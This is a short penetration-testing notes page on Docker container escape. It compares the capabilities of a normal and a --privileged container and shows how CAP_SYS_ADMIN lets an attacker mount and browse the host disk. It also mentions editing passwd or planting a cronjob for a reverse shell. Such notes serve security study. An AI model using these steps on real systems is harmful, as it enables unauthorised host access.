# Containerisation



## Docker

If you have code-execution in a host with docker installed, and have the appropriate permissions to use it, then you can escalate your permissions fairly trivially.  The process via the docker group is explained in the [Linux Privilege Escalation](https://booj.gitbook.io/virgil/linux/privilege-escalation#docker) section.

### docker.sock

### --privileged

The following shows the output of a regular container's `/sbin/capsh` output:

```text
root@987553478e0f:/# /sbin/capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
```

The next is from a container spawned with the `--privileged` flag:

```text
root@ad87033b28fe:/# /sbin/capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
```

If you see `CAP_SYS_ADMIN`, then congratulations, you've won.  The easiest way to exploit this is to simply mount the whole disk and browse in that manner:

```text
root@7f6762c86d98:/# mount /dev/sda1 /mnt
root@7f6762c86d98:/# cd /mnt
root@7f6762c86d98:/mnt# ls
cache	    empty	     lib    lost+found	swap
cni	    etc		     local  nfs		tmp
containerd  kubeadm	     lock   run		transfused_start.log
docker	    kubelet-plugins  log    spool
```

If we do this on an unprivileged container, we see the following:

```text
root@987553478e0f:/# mount /dev/sda1 /mnt
mount: /mnt: permission denied.
```

Common exploitation methods from this point on include editing the passwd file, or injecting a malicious cronjob to start services or return a reverse shell.



{% embed url="https://ericchiang.github.io/post/containers-from-scratch/" %}

{% embed url="https://kinvolk.io/blog/2018/04/towards-unprivileged-container-builds/" %}

{% embed url="https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html" %}

